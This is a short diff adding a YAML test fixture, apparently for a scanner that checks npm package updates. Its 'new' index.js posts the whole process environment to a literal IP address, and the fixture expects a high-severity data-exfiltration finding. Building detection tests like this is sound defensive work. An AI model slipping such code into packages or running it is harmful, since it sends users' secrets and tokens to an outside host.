@@ -1,0 +1,8 @@
+eco: npm
+note: 'the environment posted with fetch to a literal new host is high'
+old:
+  index.js: "module.exports = function () { return 1; };\n"
+new:
+  index.js: "module.exports = async function () {\n  const body = JSON.stringify(process.env);\n  await fetch('https://203.0.113.50/collect', { method: 'POST', body });\n};\n"
+expect:
+- {id: data-exfil, min_severity: high}
